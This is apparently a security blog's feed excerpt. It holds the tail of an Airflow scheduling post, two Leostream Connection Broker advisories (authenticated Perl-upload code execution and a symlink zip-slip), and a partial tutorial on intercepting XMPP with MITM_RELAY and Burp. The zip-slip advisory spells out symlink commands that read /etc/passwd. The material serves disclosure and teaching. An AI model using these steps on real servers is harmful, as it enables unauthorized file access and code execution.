&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;pendulum&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;# get the format date string&lt;br&gt;current_date = pendulum.datetime.now().strftime(&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;%Y, %m, %d, %H&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&#34;)&lt;br&gt;dag = DAG(&lt;br&gt;&amp;nbsp; dag_id = dag_id,&lt;br&gt;&amp;nbsp; # get the datetime type value&lt;br&gt;&amp;nbsp; start_date = pendulum.strptime(current_date, &#34;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;%Y, %m, %d, %H&#34;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;).astimezone(&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;Europe/London&#39;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;).subtract(hours=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;),&lt;br&gt;&amp;nbsp; default_args = default_args,&lt;br&gt;&amp;nbsp; schedule_interval = timedelta(hours=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;),&lt;br&gt;)&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;With this setting, you can introduce a trial task before the current time and you can make sure the time is the same as your local timezone. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. ExternalTaskSensor Stuck Problem&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When people design dependent tasks in different dags, the ExternalTaskSensor is a common function to use. But if you do not follow some best practices, it can quite easily get stuck. The main problem relates to the time settings for DAGs. Among the errors that can occur, the most common is where the previous task generates a large middle value and it is impossible to transfer to an external task because of the &lt;a href=&#34;https://airflow.apache.org/docs/stable/_modules/airflow/models/xcom.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;size limitation&lt;/strong&gt;&lt;/a&gt; for middle value storage. &lt;/p&gt;
&lt;p&gt;So, how to best set the time for DAGs? Based on an answer from &lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;stackoverflow&lt;/strong&gt;&lt;/a&gt;: the DAGs don&amp;rsquo;t need to have the same start_date. If you create your ExternalTaskSensor task without the execution_delta or execution_date_fn, then the two DAGs need to have the same &lt;strong&gt;&lt;em&gt;execution date&lt;/em&gt;&lt;/strong&gt;. It so happens that if two DAGs have the same schedule, a scheduled task running in each interval will have the same execution date.&lt;/p&gt;
&lt;p&gt;The optimal choice is to exclude execution_delta and execution_data_fn if you encounter challenges when computing the time. You should &lt;strong&gt;never manually trigger (in the Links column) the DAG in WebUI&lt;/strong&gt; &lt;strong&gt;if the result will be sent to the next DAG&lt;/strong&gt;. It will generate different execution dates. In practice, I defined the same start_date by setting a specific date. When I start the DAGs in Web UI, I will &lt;strong&gt;press all the DAG buttons&lt;/strong&gt; at the same time if those DAGs are dependent on one other.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/DAGs-View-PNG2.png&#34; alt=&#34;DAGs View PNG2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;PNG2：&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.4/ui.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DAGs View&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a very brief description of my solutions for the tricky problems I encountered. Thanks for reading!&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/45568439/how-do-i-trigger-airflow-dag-using-triggerdagrunoperator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;How do I trigger Airflow -dag using TriggerDagRunOperator&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://stackoverflow.com/questions/45568439/how-do-i-trigger-airflow-dag-using-triggerdagrunoperator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_I have found following link: https://www.linkedin.com/pulse/airflow-lesson-1-triggerdagrunoperator-siddharth-anand…_stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Airflow ExternalTaskSensor gets stuck&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_I&amp;rsquo;m trying to use ExternalTaskSensor and it gets stuck at poking another DAG&amp;rsquo;s task, which has already been…_stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@delmira91/sensing-the-completion-of-external-airflow-tasks-827344d03142&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Sensing the completion of external airflow tasks&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://medium.com/@delmira91/sensing-the-completion-of-external-airflow-tasks-827344d03142&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_(Not the best title)_medium.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://towardsdatascience.com/creating-a-dynamic-dag-using-apache-airflow-a7a6f3c434f3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Creating a dynamic DAG using Apache Airflow&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://towardsdatascience.com/creating-a-dynamic-dag-using-apache-airflow-a7a6f3c434f3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_Today we want to share with you one problem we solved by using Apache Airflow. We have a project comprising more than…_towardsdatascience.com&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2021-41550 Leostream Connection Broker - Authenticated Remote Code Execution</title>
      <link>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/</link>
      <pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Leostream Connection Broker&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 9.0.40.17&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://leostream.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://leostream.com/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-41550&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2021-41550&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 25/01/2022&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As the Leostream Connection Broker version: 9.0.40.17 allowed an attacker to upload any content through Third Party Content functionality, it was found that the application allowed the listed filenames below the ability to execute Perl programming language by default on the web application.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions as soon as possible. Leostream&amp;rsquo;s release notes and advisories can be found &lt;a href=&#34;https://leostream.com/wp-content/uploads/2018/11/Leostream_release_notes.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For achieving remote code execution, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload Perl files to be executed server-side. The default web server configuration in use by the web application (which is accessible by downloading the archive at &amp;ldquo;Download Technical Support Package&amp;rdquo; link on the left menu bar from Leostream&amp;rsquo;s website) contained the httpd.conf, which shows that the following filenames can be executed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;all_back.pl&lt;/li&gt;
&lt;li&gt;clients.pl&lt;/li&gt;
&lt;li&gt;config.pl&lt;/li&gt;
&lt;li&gt;database_error.pl&lt;/li&gt;
&lt;li&gt;error_document.pl&lt;/li&gt;
&lt;li&gt;fastlist.pl&lt;/li&gt;
&lt;li&gt;index.pl&lt;/li&gt;
&lt;li&gt;invite.pl&lt;/li&gt;
&lt;li&gt;license.pl&lt;/li&gt;
&lt;li&gt;logout.pl&lt;/li&gt;
&lt;li&gt;pcoip_broker.pl&lt;/li&gt;
&lt;li&gt;plan.pl&lt;/li&gt;
&lt;li&gt;rest.pl&lt;/li&gt;
&lt;li&gt;rpc.pl&lt;/li&gt;
&lt;li&gt;sam.pl&lt;/li&gt;
&lt;li&gt;saml.pl&lt;/li&gt;
&lt;li&gt;search.pl&lt;/li&gt;
&lt;li&gt;server.pl&lt;/li&gt;
&lt;li&gt;status.pl&lt;/li&gt;
&lt;li&gt;support.pl&lt;/li&gt;
&lt;li&gt;syslog_server.pl&lt;/li&gt;
&lt;li&gt;user.pl&lt;/li&gt;
&lt;li&gt;view.pl&lt;/li&gt;
&lt;li&gt;webquery.pl&lt;/li&gt;
&lt;li&gt;Welcome.pl&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The malicious file will be made available under the /tpc/ directory on the web server. The attacker can then trigger the malicious code execution by visiting the uploaded files.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;10/09/2021: Issue reported to the vendor&lt;br&gt;
10/09/2021: Vendor acknowledged the issues&lt;br&gt;
22/09/2021: CVE number assigned from MITRE&lt;br&gt;
16/10/2021: The security patch was released by Leostream&lt;br&gt;
25/01/2021: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2021-41551 Leostream Connection Broker - Authenticated Zip Slip</title>
      <link>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/</link>
      <pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Leostream Connection Broker&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 9.0.40.17&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://leostream.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://leostream.com/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-41551&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2021-41551&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 25/01/2022&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: path traversal, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Leostream Connection Broker 9.0.40.17 allows administrators to conduct directory traversal attacks by uploading a ZIP file that contains a symbolic link.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions to this new version as soon as possible. Leostream&amp;rsquo;s advice and release notes can be found &lt;a href=&#34;https://leostream.com/wp-content/uploads/2018/11/Leostream_release_notes.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For achieving local file inclusion, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload zip files to be extracted in the web server directory. The attackers uploaded zip file should be created with a symbolic link by executing “ln -s /etc/passwd passwd”, which can then be zipped using “zip &amp;ndash;symlink -r upload.zip passwd” to create the archive. After supplying the zip file to the application, the archive will be extracted and the target file (in this case /etc/passwd) will be accessible in the /tpc/ directory of the web server, in this example /tpc/passwd.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;10/09/2021: Issue reported to the vendor&lt;br&gt;
10/09/2021: Vendor acknowledged the issues&lt;br&gt;
22/09/2021: CVE number assigned from MITRE&lt;br&gt;
16/10/2021: The security patch was released by Leostream&lt;br&gt;
25/01/2021: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Burp Suite and Beyond: Exploring non-HTTP protocols using MITM_RELAY</title>
      <link>//localhost:1313/articles/2021/08/2021-08-24-burpsuite-and-beyond/</link>
      <pubDate>Tue, 24 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/08/2021-08-24-burpsuite-and-beyond/</guid>
      <description>
        
        
        &lt;p&gt;By &lt;a href=&#34;https://twitter.com/hit1t&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Muhammet Ali A&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/hit1t&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;rıtürk&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this article, Muhammet takes us on a deep technical journey to persevere beyond the limitations of the proxy tool Burp Suite, and explore non-HTTP, application-layer protocols using ‘MITM RELAY’.&lt;/p&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;As an offensive security tester, we often rely on Burp Suite. While an excellent resource when penetration testing, it’s not without limitations, as we explored in our previous article on &lt;a href=&#34;https://labs.jumpsec.com/burp-suite-python-scripter/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;utilising custom python scripts.&lt;/strong&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;To get around some particular limitations in a recent case, I used a cool tool called &lt;a href=&#34;https://github.com/jrmdev/mitm_relay&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;MITM_RELAY&lt;/strong&gt;&lt;/a&gt; which is described as a “hackish way to intercept and modify non-HTTP protocols through Burp &amp;amp; others”. &lt;/p&gt;
&lt;p&gt;This tool allows us to compensate for Burp Suite’s limitations and extend it’s proxying capabilities for protocols beyond HTTP. Let’s explore why this is important when looking to secure an application. &lt;/p&gt;
&lt;h1&gt;Simulating a man-in-the-middle&lt;/h1&gt;&lt;p&gt;Imagine &lt;strong&gt;a mobile application&lt;/strong&gt;. We’ll call it &lt;strong&gt;Alpaca App.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/alpaca_app.png&#34; alt=&#34;alpaca app&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It has loads of great features that keep you connected with your favourite Alpaca friends. Besides being cool, the mobile app needs to be &lt;strong&gt;secure&lt;/strong&gt; when you’re using it to access the big bad internet. &lt;/p&gt;
&lt;p&gt;Our task in this article is to understand if the app is broadcasting and transferring data securely or insecurely enough for an adversary to &lt;strong&gt;intercept&lt;/strong&gt; the traffic. This can also be understood as &lt;strong&gt;man-in-the-middle&lt;/strong&gt; (MITM) attack, whereby a malicious (and nosy) actor eavesdrops on the network traffic that a machine is innocently transmitting and steals or manipulates the data for their evil purposes. &lt;/p&gt;
&lt;p&gt;An important tool for MITM research involves &lt;strong&gt;proxying&lt;/strong&gt;, which acts as an intermediate between two machines - and can be weaponized for evil purposes. &lt;a href=&#34;https://portswigger.net/burp/documentation/desktop/tools/proxy/getting-started&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; is a staple tool for studying web app and mobile app communications, as it proxies the information between the client and server so we can research exactly how the application works.&lt;/p&gt;
&lt;p&gt;Definitions aside, let’s talk about the technical complications for proxying our specific mobile app. Take a big old sip of coffee, and let&amp;rsquo;s get to work.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/coffee.png&#34; alt=&#34;coffee&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;The limits of Burp Suite&lt;/h1&gt;&lt;p&gt;Burp Suite is able to catch &lt;strong&gt;HTTP&lt;/strong&gt; &lt;strong&gt;communications.&lt;/strong&gt; This is a specific application-layer protocol. The diagram below shows the process by which Burp Suite proxies communications over HTTP protocol. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/burp.png&#34; alt=&#34;burp&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;However, Burp Suite is &lt;strong&gt;ONLY&lt;/strong&gt; able to proxy this specific protocol. &lt;strong&gt;Unfortunately, Alpaca App doesn’t use HTTP to communicate. It uses XMPP instead.&lt;/strong&gt; So what now? &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Extensible Messaging and Presence Protocol (XMPP for short) is another application-layer protocol that is some decades old now, and originally went by the name &lt;strong&gt;Jabber.&lt;/strong&gt; &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Thankfully, we can use our new tool to intercept anything we want.&lt;/strong&gt; &lt;/p&gt;
&lt;h1&gt;Proxying XMPP traffic using MITM Relay&lt;/h1&gt;&lt;p&gt;As mentioned earlier, we are trying to understand whether &lt;strong&gt;Alpaca App is communicating securely.&lt;/strong&gt; Because it communicates via XMPP, we need to intercept that traffic and then study it. Let’s explain that again through a diagram: &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/xmpp.png&#34; alt=&#34;xmpp&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Not bad. So now we have a limited tool (Burp Suite) and we have a tool that can upgrade it (MITM_RELAY), so let’s get to work combining this so Burp Suite can understand Alpaca App’s XMPP!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Burp Suite has &lt;a href=&#34;https://portswigger.net/burp/documentation/desktop/tools/extender&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;its own extension&lt;/strong&gt;&lt;/a&gt; for &lt;a href=&#34;https://portswigger.net/bappstore/1d0986521ace4b2dbf0b70836efa999d&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;XMPP protocol interception&lt;/strong&gt;&lt;/a&gt;, but I didn’t find this to be as effective as the MITM_RELAY tool. &lt;/p&gt;
&lt;p&gt;The Burp XMPP extension would occasionally drop packets, which is obviously not ideal when trying to build a robust picture of the security of the app. The Burp extension, while having some good features, needed quite a bit of tinkering to make it work. &lt;/p&gt;
&lt;p&gt;In contrast, I found the MITM_RELAY tool easier to use, but really, you can use anything that you feel comfortable with!&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The &lt;a href=&#34;https://github.com/jrmdev/mitm_relay&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;creators&lt;/strong&gt;&lt;/a&gt; of the tool made a nice diagram below about how the tool works, and how to intercept different types of traffic via HTTP (Burp Suite) Proxy.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mitm.png&#34; alt=&#34;mitm&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Digging deeper, the relay server has &lt;strong&gt;three&lt;/strong&gt; &lt;strong&gt;key&lt;/strong&gt; functions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Relay Listener&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;A &lt;strong&gt;listener&lt;/strong&gt; for a specific protocol and a specific source port will &lt;strong&gt;forward&lt;/strong&gt; the traffic to our &lt;strong&gt;target IP and target PORT&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Packet Wrapper and Unwrapper&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;This component will wrap all traffic into HTTP form and deliver it to the proxy tool. When the proxy tool forwards the traffic on, it will unwrap the traffic to it’s original protocol)&lt;/li&gt;
&lt;li&gt;So XMPP &amp;mdash;&amp;raquo; HTTP &amp;mdash;&amp;raquo; XMPP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Echo Web Server&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;This web server is a required part of this. As we’re sending the request over out proxy tool there will need to be a response after we finish sending the request&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/1.png&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Let’s go through this step by step. Assume our first XMPP packet has left &lt;strong&gt;Alpaca App,&lt;/strong&gt; and was intending to reach &lt;strong&gt;Alpaca Inc.’s servers&lt;/strong&gt; out in the big internet. &lt;/p&gt;
&lt;p&gt;1. It will pass through our relay server, be wrapped in HTTP, and sent to the Proxy server (Burp Suite)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2.png&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2. After completing the wrapping-modification of the initial request, we will send it to the &lt;strong&gt;Echo Web server.&lt;/strong&gt; This will forward it to the upper level to unwrap it to the original protocol (XMPP) readying it to send to the Alpaca Inc. Server as originally intended:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3.png&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3. So far we have managed to successfully send Alpaca App’s XMPP traffic to the Alpaca Inc. server, situated on the internet. It is now the Alpaca Inc. server’s turn to answer us. Lets see how that works in return:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/4.png&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The application server then answers in the Alpaca app. We now have the ability to modify our requests to change the information we receive. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/5.png&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;4. When we are done examining Alpaca Inc.’s server response, we will let the XMPP packet go back to the client-side, (the Alpaca App). The same wrapping, unwrapping, and echo repeating occurs here to deliver the traffic back. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/6.png&#34; alt=&#34;6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So far, so good? Are you doing alright? Here’s an alpaca meme to lighten things up.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/bags.png&#34; alt=&#34;bags&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We have followed the process from the first XMPP traffic from Alpaca App on our mobile phone, through our Burp Suite-MITM_RELAY that wraps it up in HTTP, and then when it unwraps it back to XMPP and gives it the Alpaca Inc. Server - and then back again through this whole apparatus.&lt;/p&gt;
&lt;p&gt;I hope you enjoyed the visuals, and they provided some benefit. &lt;strong&gt;Let’s open up the command-line, so you can replicate this and set this up too!&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Getting hands-on!&lt;/h1&gt;&lt;p&gt;Are you ready to do this yourself? You’ll need:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/jrmdev/mitm_relay&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MITM_RELAY script&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A proxy tool&lt;/strong&gt; (Burp, in our case)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Two mobile clients:&lt;/strong&gt; talking to each other using an the app’s XMPP protocol, &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A firewall rule:&lt;/strong&gt; needed to route the traffic from mobile client to relay server.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Setting up the environment&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setting-up-the-environment&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setting-up-the-environment&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;MITM_RELAY&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mitm_relay&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mitm_relay&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;For our MITM_RELAY setup, let&amp;rsquo;s look at the parameters we need:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/params-1-1024x114.png&#34; alt=&#34;params 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-r&lt;/code&gt;:  Relaying settings. This parameter helps us to configure the relay
&lt;ul&gt;
&lt;li&gt;[local port] : [dest_host] : [dest_port]&lt;/li&gt;
&lt;li&gt;Or adding protocol: [udp:|tcp:] lport: rhost : rport&lt;/li&gt;
&lt;li&gt;Example: tcp:8083:142.250.187.238:443 &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; &lt;strong&gt;:&lt;/strong&gt; Relay listener. This is the address the relays will listen on. 
&lt;ul&gt;
&lt;li&gt;Be careful when setting this address, your relay listening address must be reachable from the client of you.&lt;/li&gt;
&lt;li&gt;And must be the same in  &amp;ndash;to&amp;ndash;destination  in iptables rule you use&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;&lt;strong&gt;:&lt;/strong&gt; The proxy parameter, in this case our proxy server will be in place&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Our MITM relay is now ready&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mitmready.png&#34; alt=&#34;mitmready&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Proxy Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;proxy-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#proxy-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We then can set up the rest of our proxy tooling and client-side Alpaca mobile app communication. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Our proxy tool (Burp Suite) is listening on &lt;strong&gt;192.168.1.184:8083&lt;/strong&gt;&lt;/li&gt;
